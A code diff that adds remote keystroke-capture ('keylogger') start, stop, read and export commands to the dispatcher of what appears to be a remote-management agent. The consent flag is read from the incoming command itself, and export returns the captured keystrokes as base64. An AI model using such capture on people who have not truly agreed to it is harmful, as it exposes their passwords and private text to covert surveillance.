@@ -5,6 +5,12 @@ from typing import Any
 
 from apps.agent.consent import display_consent_prompt
 from apps.agent.files import get_file, put_file
+from apps.agent.key_capture import (
+    export_key_capture_events,
+    get_key_capture_events,
+    start_key_capture_session,
+    stop_key_capture_session,
+)
 from apps.agent.power_provider import run_power_action
 from apps.agent.providers import AgentProviders, build_providers
 from apps.agent.remote_files import discover_allowed_remote_folders, download_allowed_file, list_files_in_allowed_folder
@@ -33,6 +39,21 @@ async def handle_command(machine_id: str, command: dict[str, Any], sandbox_root:
         return providers.processes.stop_process(int(command["pid"]), bool(command.get("confirm")))
     if action == "input_event":
         return providers.input_controller.handle_input(command)
+    if action == "keylogger_start":
+        return start_key_capture_session(
+            int(command.get("ttl_seconds") or 60),
+            {"approved": bool(command.get("consent"))},
+            session_id=str(command.get("session_id") or ""),
+            machine_id=machine_id,
+            requested_by=str(command.get("requested_by") or ""),
+        )
+    if action == "keylogger_stop":
+        return stop_key_capture_session(str(command["session_id"]))
+    if action == "keylogger_events":
+        return {"events": get_key_capture_events(str(command["session_id"]))}
+    if action == "keylogger_export":
+        data = export_key_capture_events(str(command["session_id"]), {"approved": bool(command.get("consent"))})
+        return {"filename": f"keylogger-{command['session_id']}.csv", "content_base64": __import__("base64").b64encode(data).decode()}
     if action == "consent_request":
         return display_consent_prompt(dict(command["request"]))
     if action == "capture_screen":
